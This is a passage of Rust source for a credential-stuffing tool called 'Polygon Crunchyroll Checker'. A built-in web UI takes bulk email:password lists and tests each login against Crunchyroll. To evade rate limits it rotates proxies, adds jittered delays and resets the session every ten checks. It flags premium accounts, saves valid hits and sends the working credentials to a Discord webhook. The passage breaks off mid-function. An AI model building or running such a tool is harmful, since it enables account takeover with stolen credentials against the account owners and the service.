use crunchyroll_rs::{Crunchyroll, crunchyroll::CrunchyrollBuilder, Locale};
use std::fs::OpenOptions;
use std::io::BufWriter;
use std::io::Write;
use crunchyroll_rs::crunchyroll::MaturityRating;
use tokio::time::{timeout, Duration, sleep};
use std::sync::{Arc, Mutex};
use std::time::Instant;
use axum::{
    routing::{get, post},
    Router, Json, response::Html,
};
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;

static LAST_FAILED: Mutex<Option<(String, String)>> = Mutex::new(None);
static PROXIES: Mutex<Vec<String>> = Mutex::new(Vec::new());
static PROXY_INDEX: Mutex<usize> = Mutex::new(0);
static DISCORD_WEBHOOK: Mutex<Option<String>> = Mutex::new(None);
static RATE_LIMIT_COUNT: Mutex<u32> = Mutex::new(0);
static VALID_ACCOUNTS: Mutex<Vec<String>> = Mutex::new(Vec::new());
static CHECK_COUNT: Mutex<usize> = Mutex::new(0);
static COOLDOWN_UNTIL: Mutex<Option<Instant>> = Mutex::new(None);
static STOP_CHECKING: Mutex<bool> = Mutex::new(false);

// ANSI color codes
const GREEN: &str = "\x1b[32m";
const RED: &str = "\x1b[31m";
const YELLOW: &str = "\x1b[33m";
const BLUE: &str = "\x1b[34m";
const MAGENTA: &str = "\x1b[35m";
const CYAN: &str = "\x1b[36m";
const RESET: &str = "\x1b[0m";
const BOLD: &str = "\x1b[1m";

const FRONTEND_HTML: &str = r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Polygon Crunchyroll Checker</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            color: #e4e4e7;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
        }

        .header-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
        }

        .header img {
            width: 60px;
            height: 60px;
            border-radius: 12px;
        }

        .header h1 {
            font-size: 2.5em;
            background: linear-gradient(135deg, #f7931e 0%, #ff6b35 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .header p {
            color: #94a3b8;
            margin-top: 8px;
            font-size: 0.95em;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 24px;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-4px);
            border-color: rgba(247, 147, 30, 0.5);
            box-shadow: 0 8px 32px rgba(247, 147, 30, 0.2);
        }

        .stat-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 12px;
            font-size: 1.5em;
        }

        .stat-icon.green { background: rgba(34, 197, 94, 0.2); color: #22c55e; }
        .stat-icon.blue { background: rgba(59, 130, 246, 0.2); color: #3b82f6; }
        .stat-icon.red { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
        .stat-icon.orange { background: rgba(247, 147, 30, 0.2); color: #f7931e; }
        .stat-icon.purple { background: rgba(168, 85, 247, 0.2); color: #a855f7; }

        .stat-value {
            font-size: 2.5em;
            font-weight: 700;
            margin-bottom: 4px;
        }

        .stat-label {
            color: #94a3b8;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 30px;
        }

        @media (max-width: 1024px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }

        .panel {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 30px;
        }

        .panel-title {
            font-size: 1.5em;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .panel-title i {
            color: #f7931e;
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }

        .tab-btn {
            flex: 1;
            min-width: 150px;
            padding: 12px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            cursor: pointer;
            font-size: 1em;
            font-weight: 600;
            transition: all 0.3s ease;
            color: #e4e4e7;
        }

        .tab-btn:hover {
            background: rgba(247, 147, 30, 0.1);
            border-color: rgba(247, 147, 30, 0.3);
        }

        .tab-btn.active {
            background: linear-gradient(135deg, #f7931e 0%, #ff6b35 100%);
            color: white;
            box-shadow: 0 4px 12px rgba(247, 147, 30, 0.2);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .control-item {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .control-item:hover {
            background: rgba(247, 147, 30, 0.1);
            border-color: rgba(247, 147, 30, 0.3);
            transform: translateX(4px);
        }

        .control-icon {
            width: 48px;
            height: 48px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.3em;
            background: linear-gradient(135deg, #f7931e 0%, #ff6b35 100%);
            color: white;
        }

        .control-content h3 {
            font-size: 1.1em;
            margin-bottom: 4px;
        }

        .control-content p {
            color: #94a3b8;
            font-size: 0.9em;
        }

        .btn {
            width: 100%;
            padding: 16px 24px;
            background: linear-gradient(135deg, #f7931e 0%, #ff6b35 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(247, 147, 30, 0.4);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .btn.secondary {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .btn.danger {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
        }

        .btn.danger:hover {
            box-shadow: 0 8px 24px rgba(239, 68, 68, 0.4);
        }

        .button-group {
            display: flex;
            gap: 10px;
        }

        .button-group .btn {
            flex: 1;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #e4e4e7;
        }

        .input-group input, .input-group textarea, .input-group select {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: #e4e4e7;
            font-size: 1em;
            transition: all 0.3s;
        }

        .input-group input:focus, .input-group textarea:focus, .input-group select:focus {
            outline: none;
            border-color: #f7931e;
            box-shadow: 0 0 0 3px rgba(247, 147, 30, 0.1);
        }

        .input-group textarea {
            resize: vertical;
            min-height: 120px;
            font-family: 'Courier New', monospace;
        }

        .input-group small {
            display: block;
            margin-top: 6px;
            color: #94a3b8;
            font-size: 0.85em;
        }

        .toggle-group {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .toggle-content h4 {
            font-size: 1em;
            margin-bottom: 4px;
        }

        .toggle-content p {
            color: #94a3b8;
            font-size: 0.85em;
        }

        .switch {
            position: relative;
            width: 60px;
            height: 32px;
        }

        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.1);
            transition: 0.3s;
            border-radius: 32px;
        }

        .slider:before {
            position: absolute;
            content: "";
            height: 24px;
            width: 24px;
            left: 4px;
            bottom: 4px;
            background: white;
            transition: 0.3s;
            border-radius: 50%;
        }

        input:checked + .slider {
            background: linear-gradient(135deg, #f7931e 0%, #ff6b35 100%);
        }

        input:checked + .slider:before {
            transform: translateX(28px);
        }

        .results-area {
            max-height: 500px;
            overflow-y: auto;
            padding-right: 10px;
        }

        .results-area::-webkit-scrollbar {
            width: 8px;
        }

        .results-area::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
        }

        .results-area::-webkit-scrollbar-thumb {
            background: rgba(247, 147, 30, 0.5);
            border-radius: 10px;
        }

        .result-item {
            background: rgba(255, 255, 255, 0.03);
            border-left: 3px solid;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 12px;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .result-item.valid {
            border-color: #22c55e;
            background: rgba(34, 197, 94, 0.05);
        }

        .result-item.invalid {
            border-color: #ef4444;
            background: rgba(239, 68, 68, 0.05);
        }

        .result-item.rate-limit {
            border-color: #a855f7;
            background: rgba(168, 85, 247, 0.05);
        }

        .result-status {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .result-details {
            color: #94a3b8;
            font-size: 0.9em;
            font-family: 'Courier New', monospace;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
            display: none;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #f7931e 0%, #ff6b35 100%);
            transition: width 0.3s;
            width: 0%;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-content">
                <img src="https://imgs.search.brave.com/YCB9OZLmBwMgbcwZnra7LfWB5miAA7YtYNzt6rs98ws/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdGF0/aWMud2lraWEubm9j/b29raWUubmV0L2xv/Z29wZWRpYS9pbWFn/ZXMvOS85Mi9DcnVu/Y2h5cm9sbF9zeW1i/b2xfMjAyNC5zdmcv/cmV2aXNpb24vbGF0/ZXN0L3NjYWxlLXRv/LXdpZHRoLWRvd24v/MjAwP2NiPTIwMjQx/MDMwMTIwNjE1" alt="Crunchyroll">
                <div>
                    <h1>Polygon Crunchyroll Checker</h1>
                    <p>Made by Polygon • discord.gg/BmPKXpbYHK</p>
                </div>
            </div>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon orange"><i class="fas fa-chart-line"></i></div>
                <div class="stat-value" id="totalChecked">0</div>
                <div class="stat-label">Total Checked</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon green"><i class="fas fa-check-circle"></i></div>
                <div class="stat-value" id="validCount">0</div>
                <div class="stat-label">Valid Accounts</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon red"><i class="fas fa-times-circle"></i></div>
                <div class="stat-value" id="invalidCount">0</div>
                <div class="stat-label">Invalid Accounts</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon blue"><i class="fas fa-star"></i></div>
                <div class="stat-value" id="premiumCount">0</div>
                <div class="stat-label">Premium Found</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon purple"><i class="fas fa-clock"></i></div>
                <div class="stat-value" id="rateLimitCount">0</div>
                <div class="stat-label">Rate Limited</div>
            </div>
        </div>

        <div class="main-grid">
            <div class="panel">
                <h2 class="panel-title"><i class="fas fa-sliders-h"></i> Control Panel</h2>
                <div class="tabs">
                    <button class="tab-btn active" onclick="switchTab('single')">Single Check</button>
                    <button class="tab-btn" onclick="switchTab('batch')">Bulk Verification</button>
                    <button class="tab-btn" onclick="switchTab('settings')">Settings</button>
                    <button class="tab-btn" onclick="switchTab('export')">Export</button>
                </div>
                <div id="single" class="tab-content active">
                    <div class="input-group">
                        <label>Account Credentials</label>
                        <input type="text" id="singleAccount" placeholder="email@example.com:password123">
                        <small>Format: email:password</small>
                    </div>
                    <button class="btn" onclick="checkSingle()"><i class="fas fa-play"></i> Check Account</button>
                </div>
                <div id="batch" class="tab-content">
                    <div class="input-group">
                        <label>Account List</label>
                        <textarea id="batchAccounts" placeholder="email1@example.com:pass1&#10;email2@example.com:pass2&#10;email3@example.com:pass3"></textarea>
                        <small>One account per line (email:password format)</small>
                    </div>
                    <div class="progress-bar" id="progressBar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <div class="button-group">
                        <button class="btn" id="batchBtn" onclick="checkBatch()"><i class="fas fa-rocket"></i> Start Bulk Check</button>
                        <button class="btn danger" id="stopBtn" onclick="stopChecking()" style="display: none;"><i class="fas fa-stop"></i> Stop</button>
                    </div>
                </div>
                <div id="settings" class="tab-content">
                    <div class="toggle-group">
                        <div class="toggle-content">
                            <h4>Advanced Mode</h4>
                            <p>Enable advanced checking features</p>
                        </div>
                        <label class="switch">
                            <input type="checkbox" id="advancedMode">
                            <span class="slider"></span>
                        </label>
                    </div>

                    <div class="toggle-group">
                        <div class="toggle-content">
                            <h4>Use Proxies</h4>
                            <p>Route requests through proxy servers</p>
                        </div>
                        <label class="switch">
                            <input type="checkbox" id="proxyMode">
                            <span class="slider"></span>
                        </label>
                    </div>

                    <div class="input-group">
                        <label>Proxy List</label>
                        <textarea id="proxyList" placeholder="http://ip:port&#10;http://user:pass@ip:port"></textarea>
                        <small>One proxy per line</small>
                    </div>

                    <button class="btn secondary" onclick="testAllProxies()" style="margin-bottom: 20px;"><i class="fas fa-vial"></i> Test All Proxies</button>

                    <div class="toggle-group">
                        <div class="toggle-content">
                            <h4>Discord Webhook</h4>
                            <p>Send results to Discord</p>
                        </div>
                        <label class="switch">
                            <input type="checkbox" id="webhookMode">
                            <span class="slider"></span>
                        </label>
                    </div>

                    <div class="input-group">
                        <label>Webhook URL</label>
                        <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
                    </div>

                    <div class="input-group">
                        <label>Delay Between Checks</label>
                        <input type="number" id="delayBetweenChecks" placeholder="2000" min="0" max="30000" value="2000">
                        <small>Milliseconds (Recommended: 2000-5000ms to avoid rate limits)</small>
                    </div>

                    <button class="btn" onclick="saveSettings()"><i class="fas fa-save"></i> Save Settings</button>
                    <button class="btn secondary" style="margin-top: 10px;" onclick="resetSession()"><i class="fas fa-sync"></i> Reset Session</button>
                </div>
                <div id="export" class="tab-content">
                    <div class="input-group">
                        <label>Export Format</label>
                        <select id="exportFormat">
                            <option value="txt">Text File (.txt)</option>
                            <option value="json">JSON (.json)</option>
                            <option value="csv">CSV (.csv)</option>
                        </select>
                        <small>Choose your preferred export format</small>
                    </div>

                    <button class="btn" onclick="exportResults()"><i class="fas fa-file-download"></i> Download Results</button>

                    <div style="margin-top: 24px; padding: 20px; background: rgba(255, 255, 255, 0.03); border-radius: 12px;">
                        <h4 style="margin-bottom: 12px;">Export Information</h4>
                        <p style="color: #94a3b8; font-size: 0.9em; line-height: 1.6;">
                            • <strong>Text:</strong> Simple email:pass format<br>
                            • <strong>JSON:</strong> Full account details with metadata<br>
                            • <strong>CSV:</strong> Spreadsheet-compatible format
                        </p>
                    </div>
                </div>
            </div>

            <div class="panel">
                <h2 class="panel-title"><i class="fas fa-stream"></i> Live Results</h2>
                <div class="results-area" id="results"></div>
            </div>
        </div>
    </div>

    <script>
        let stats = { total: 0, valid: 0, invalid: 0, premium: 0, rateLimit: 0 };
        let validAccounts = [];
        let isChecking = false;

        function switchTab(tab) {
            const tabs = document.querySelectorAll('.tab-btn');
            const contents = document.querySelectorAll('.tab-content');
            tabs.forEach(t => t.classList.remove('active'));
            contents.forEach(c => c.classList.remove('active'));
            document.querySelector(`.tab-btn[onclick="switchTab('${tab}')"]`).classList.add('active');
            document.getElementById(tab).classList.add('active');
        }

        function updateStats() {
            document.getElementById('totalChecked').textContent = stats.total;
            document.getElementById('validCount').textContent = stats.valid;
            document.getElementById('invalidCount').textContent = stats.invalid;
            document.getElementById('premiumCount').textContent = stats.premium;
            document.getElementById('rateLimitCount').textContent = stats.rateLimit;
        }

        function addResult(account, isValid, isPremium = false, details = '') {
            const results = document.getElementById('results');
            const item = document.createElement('div');
            
            const isRateLimit = details.includes('Rate limit') || details.includes('429') || details.includes('Rate Limited');
            
            if (isRateLimit) {
                item.className = 'result-item rate-limit';
                item.innerHTML = `
                    <div class="result-status"><i class="fas fa-clock"></i> RATE LIMITED</div>
                    <div class="result-details">${account}</div>
                `;
                stats.rateLimit++;
            } else {
                item.className = `result-item ${isValid ? 'valid' : 'invalid'}`;
                const icon = isValid ? (isPremium ? 'fa-crown' : 'fa-check-circle') : 'fa-times-circle';
                const status = isValid ? (isPremium ? 'VALID (Premium)' : 'VALID') : 'INVALID';
                item.innerHTML = `
                    <div class="result-status"><i class="fas ${icon}"></i> ${status}</div>
                    <div class="result-details">${account}${details ? '<br>' + details : ''}</div>
                `;
                
                stats.total++;
                if (isValid) {
                    stats.valid++;
                    if (isPremium) stats.premium++;
                    validAccounts.push({ account, premium: isPremium, details });
                } else {
                    stats.invalid++;
                }
            }
            
            results.insertBefore(item, results.firstChild);
            updateStats();
        }

        async function checkSingle() {
            const account = document.getElementById('singleAccount').value.trim();
            if (!account || !account.includes(':')) {
                alert('Please enter account in format: email:password');
                return;
            }

            const [email, password] = account.split(':');
            
            try {
                const response = await fetch('/api/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                const data = await response.json();
                addResult(account, data.valid, data.premium, data.details || '');
            } catch (error) {
                alert('Error checking account: ' + error.message);
            }
        }

        async function checkBatch() {
            const accounts = document.getElementById('batchAccounts').value.trim().split('\n').filter(a => a.trim());
            if (accounts.length === 0) {
                alert('Please enter at least one account');
                return;
            }

            const progressBar = document.getElementById('progressBar');
            const progressFill = document.getElementById('progressFill');
            const batchBtn = document.getElementById('batchBtn');
            const stopBtn = document.getElementById('stopBtn');
            
            isChecking = true;
            progressBar.style.display = 'block';
            batchBtn.style.display = 'none';
            stopBtn.style.display = 'block';

            for (let i = 0; i < accounts.length; i++) {
                if (!isChecking) {
                    addResult('STOPPED', false, false, 'Verification stopped by user');
                    break;
                }

                const account = accounts[i].trim();
                if (account && account.includes(':')) {
                    const [email, password] = account.split(':');
                    try {
                        const response = await fetch('/api/check', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ email, password })
                        });
                        const data = await response.json();
                        addResult(account, data.valid, data.premium, data.details || '');
                    } catch (error) {
                        addResult(account, false, false, 'Error: ' + error.message);
                    }
                    
                    const progress = ((i + 1) / accounts.length * 100).toFixed(0);
                    progressFill.style.width = progress + '%';
                    progressFill.textContent = progress + '%';
                }
            }

            isChecking = false;
            progressBar.style.display = 'none';
            batchBtn.style.display = 'block';
            stopBtn.style.display = 'none';
        }

        async function stopChecking() {
            isChecking = false;
            await fetch('/api/stop', { method: 'POST' });
            document.getElementById('batchBtn').style.display = 'block';
            document.getElementById('stopBtn').style.display = 'none';
        }

        function saveSettings() {
            const settings = {
                advancedMode: document.getElementById('advancedMode').checked,
                proxyMode: document.getElementById('proxyMode').checked,
                proxies: document.getElementById('proxyList').value.trim().split('\n').filter(p => p.trim()),
                webhookMode: document.getElementById('webhookMode').checked,
                webhookUrl: document.getElementById('webhookUrl').value.trim(),
                delayBetweenChecks: parseInt(document.getElementById('delayBetweenChecks').value) || 2000
            };
            
            fetch('/api/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(settings)
            }).then(() => {
                alert('Settings saved successfully!');
            }).catch(error => {
                alert('Error saving settings: ' + error.message);
            });
        }

        function exportResults() {
            const format = document.getElementById('exportFormat').value;
            let content = '';
            let filename = '';
            let mimeType = '';

            if (format === 'txt') {
                content = validAccounts.map(a => a.account).join('\n');
                filename = 'polyroll_results.txt';
                mimeType = 'text/plain';
            } else if (format === 'json') {
                content = JSON.stringify(validAccounts, null, 2);
                filename = 'polyroll_results.json';
                mimeType = 'application/json';
            } else if (format === 'csv') {
                content = 'Account,Premium,Username\n' + validAccounts.map(a => {
                    const username = a.details.includes('Username:') ? a.details.split('Username:')[1].split('\n')[0].trim() : 'N/A';
                    return `${a.account},${a.premium},${username}`;
                }).join('\n');
                filename = 'polyroll_results.csv';
                mimeType = 'text/csv';
            }

            const blob = new Blob([content], { type: mimeType });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.click();
            URL.revokeObjectURL(url);
        }

        function resetSession() {
            fetch('/api/reset', { method: 'POST' })
                .then(() => alert('Session reset successfully!'))
                .catch(error => alert('Error resetting session: ' + error.message));
        }

        // Load settings on page load
        window.addEventListener('DOMContentLoaded', async () => {
            try {
                const response = await fetch('/api/settings');
                const settings = await response.json();
                document.getElementById('advancedMode').checked = settings.advancedMode || false;
                document.getElementById('proxyMode').checked = settings.proxyMode || false;
                document.getElementById('proxyList').value = (settings.proxies || []).join('\n');
                document.getElementById('webhookMode').checked = settings.webhookMode || false;
                document.getElementById('webhookUrl').value = settings.webhookUrl || '';
                document.getElementById('delayBetweenChecks').value = settings.delayBetweenChecks || 2000;
                
                // Update rate limit count periodically
                setInterval(async () => {
                    const statsRes = await fetch('/api/stats');
                    const statsData = await statsRes.json();
                    stats.rateLimit = statsData.rate_limit_count;
                    updateStats();
                }, 5000);
            } catch (error) {
                console.error('Error loading settings:', error);
            }
        });
    </script>
</body>
</html>"#;

#[derive(Debug, Serialize, Deserialize)]
struct CheckRequest {
    email: String,
    password: String,
}

#[derive(Debug, Serialize, Deserialize)]
struct CheckResponse {
    valid: bool,
    premium: bool,
    details: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
struct Settings {
    #[serde(rename = "advancedMode")]
    advanced_mode: bool,
    #[serde(rename = "proxyMode")]
    proxy_mode: bool,
    proxies: Vec<String>,
    #[serde(rename = "webhookMode")]
    webhook_mode: bool,
    #[serde(rename = "webhookUrl")]
    webhook_url: String,
    #[serde(rename = "delayBetweenChecks")]
    delay_between_checks: u64,
}

#[derive(Clone)]
struct AppState {
    settings: Arc<Mutex<Settings>>,
    crunchy_builder: Arc<Mutex<CrunchyrollBuilder>>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let builder = Crunchyroll::builder().locale(Locale::en_US);
    let state = AppState {
        settings: Arc::new(Mutex::new(Settings {
            advanced_mode: false,
            proxy_mode: false,
            proxies: vec![],
            webhook_mode: false,
            webhook_url: String::new(),
            delay_between_checks: 2000,
        })),
        crunchy_builder: Arc::new(Mutex::new(builder)),
    };

    let app = Router::new()
        .route("/", get(serve_html))
        .route("/api/check", post(check_account_handler))
        .route("/api/settings", get(get_settings_handler).post(save_settings_handler))
        .route("/api/stats", get(get_stats_handler))
        .route("/api/reset", post(reset_session_handler))
        .route("/api/stop", post(stop_checking_handler))
        .with_state(state);

    let addr = SocketAddr::from(([127, 0, 0, 1], 3000));
    println!("{}", GREEN);
    println!("  ██████╗  ██████╗ ██╗  ██╗   ██╗██████╗  ██████╗ ██╗     ██╗     ");
    println!(" ██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝██╔══██╗██╔═══██╗██║     ██║     ");
    println!(" ██████╔╝██║   ██║██║   ╚████╔╝ ██████╔╝██║   ██║██║     ██║     ");
    println!(" ██╔═══╝ ██║   ██║██║    ╚██╔╝  ██╔══██╗██║   ██║██║     ██║     ");
    println!(" ██║     ╚██████╔╝███████╗██║   ██║  ██║╚██████╔╝███████╗███████╗");
    println!(" ╚═╝      ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝");
    println!("{}", YELLOW);
    println!("  🎬 Polyroll Checker - Made by Polygon");
    println!("  🌐 Web UI: http://localhost:3000");
    println!("  📂 Discord: https://discord.gg/BmPKXpbYHK");
    println!("{}", RESET);
    
    if let Err(e) = open::that("http://localhost:3000") {
        eprintln!("{}Could not open browser: {}{}", RED, e, RESET);
        println!("Please manually open: http://localhost:3000");
    }

    println!("{}✅ Server started! Opening browser...{}\n", GREEN, RESET);
    
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    axum::serve(listener, app).await?;

    Ok(())
}

#[derive(Debug, Serialize)]
struct StatsResponse {
    rate_limit_count: u32,
}

#[axum::debug_handler]
async fn get_stats_handler() -> Json<StatsResponse> {
    let count = *RATE_LIMIT_COUNT.lock().unwrap();
    Json(StatsResponse {
        rate_limit_count: count,
    })
}

#[axum::debug_handler]
async fn serve_html() -> Html<&'static str> {
    Html(FRONTEND_HTML)
}

#[axum::debug_handler]
async fn stop_checking_handler() -> Json<bool> {
    *STOP_CHECKING.lock().unwrap() = true;
    Json(true)
}

#[axum::debug_handler]
async fn check_account_handler(
    axum::extract::State(state): axum::extract::State<AppState>,
    Json(req): Json<CheckRequest>,
) -> Json<CheckResponse> {
    // Check if we should stop
    if *STOP_CHECKING.lock().unwrap() {
        *STOP_CHECKING.lock().unwrap() = false;
        return Json(CheckResponse {
            valid: false,
            premium: false,
            details: Some("Verification stopped".to_string()),
        });
    }

    // Increment check count and check if we need to reset
    let should_reset = {
        let mut check_count = CHECK_COUNT.lock().unwrap();
        *check_count += 1;
        let should_reset = *check_count >= 10;
        if should_reset {
            *check_count = 0;
        }
        should_reset
    };
    
    // Auto-reset session every 10 account checks
    if should_reset {
        // Reset the session
        {
            let mut builder = state.crunchy_builder.lock().unwrap();
            *builder = Crunchyroll::builder().locale(Locale::en_US);
        }
        {
            let mut rate_limit = RATE_LIMIT_COUNT.lock().unwrap();
            *rate_limit = 0;
        }
        {
            let mut last_failed = LAST_FAILED.lock().unwrap();
            *last_failed = None;
        }
        {
            let mut proxy_index = PROXY_INDEX.lock().unwrap();
            *proxy_index = 0;
        }
        std::env::remove_var("HTTP_PROXY");
        std::env::remove_var("HTTPS_PROXY");
    }
    
    // Read settings and clone them out of the lock
    let settings = state.settings.lock().unwrap().clone();

    // Respect global cooldown, if set
    let cooldown_until_opt = {
        let guard = COOLDOWN_UNTIL.lock().unwrap();
        *guard
    };
    if let Some(until) = cooldown_until_opt {
        let now = Instant::now();
        if until > now {
            let wait = until.duration_since(now);
            sleep(wait).await;
        }
    }

    // Apply server-side delay with simple jitter to reduce patterns
    if settings.delay_between_checks > 0 {
        let jitter_ms = (std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .subsec_millis() as u64) % 400; // up to 400ms jitter
        sleep(Duration::from_millis(settings.delay_between_checks + jitter_ms)).await;
    }

    // Create a new builder with the same configuration instead of cloning
    let builder = Crunchyroll::builder().locale(Locale::en_US);
    
    if settings.proxy_mode && !settings.proxies.is_empty() {
        *PROXIES.lock().unwrap() = settings.proxies.clone();
        *PROXY_INDEX.lock().unwrap() = 0;
    }
    
    if settings.webhook_mode && !settings.webhook_url.is_empty() {
        *DISCORD_WEBHOOK.lock().unwrap() = Some(settings.webhook_url.clone());
    }
    
    match check_account_internal(&req.email, &req.password, settings.advanced_mode, settings.proxy_mode, &builder).await {
        Ok((is_premium, details)) => {
            if let Err(e) = save_account_to_file(&details) {
                eprintln!("{}Failed to save to file: {}{}", RED, e, RESET);
            }
            
            if settings.webhook_mode && !settings.webhook_url.is_empty() {
                if let Err(e) = send_to_discord(&req.email, &req.password, is_premium, &details).await {
                    eprintln!("{}Failed to send to Discord: {}{}", RED, e, RESET);
                }
            }
            
            Json(CheckResponse {
                valid: true,
                premium: is_premium,
                details: Some(format!("Username: {}", extract_username(&details))),
            })
        }
        Err(e) => {
            eprintln!("{}Check failed for {}: {}{}", RED, req.email, e, RESET);
            *LAST_FAILED.lock().unwrap() = Some((req.email.clone(), req.password.clone()));
            let simplified_error = if e.to_string().contains("invalid_grant") || e.to_string().contains("401") {
                "Invalid credentials".to_string()
            } else if e.to_string().contains("Rate limit") {
                "Rate Limited!".to_string()
            } else {
                format!("Error: {}", e)
            };
            Json(CheckResponse {
                valid: false,
                premium: false,
                details: Some(simplified_error),
            })
        }
    }
}

fn extract_username(details: &str) -> String {
    for line in details.lines() {
        if line.starts_with("Username:") {
            return line.replace("Username:", "").trim().to_string();
        }
    }
    "N/A".to_string()
}

#[axum::debug_handler]
async fn get_settings_handler(
    axum::extract::State(state): axum::extract::State<AppState>,
) -> Json<Settings> {
    let settings = state.settings.lock().unwrap().clone();
    Json(settings)
}

#[axum::debug_handler]
async fn save_settings_handler(
    axum::extract::State(state): axum::extract::State<AppState>,
    Json(new_settings): Json<Settings>,
) -> Json<bool> {
    if new_settings.proxy_mode {
        *PROXIES.lock().unwrap() = new_settings.proxies.clone();
        *PROXY_INDEX.lock().unwrap() = 0;
    }
    
    if new_settings.webhook_mode {
        *DISCORD_WEBHOOK.lock().unwrap() = Some(new_settings.webhook_url.clone());
    }
    
    *state.settings.lock().unwrap() = new_settings;
    Json(true)
}

#[axum::debug_handler]
async fn reset_session_handler(
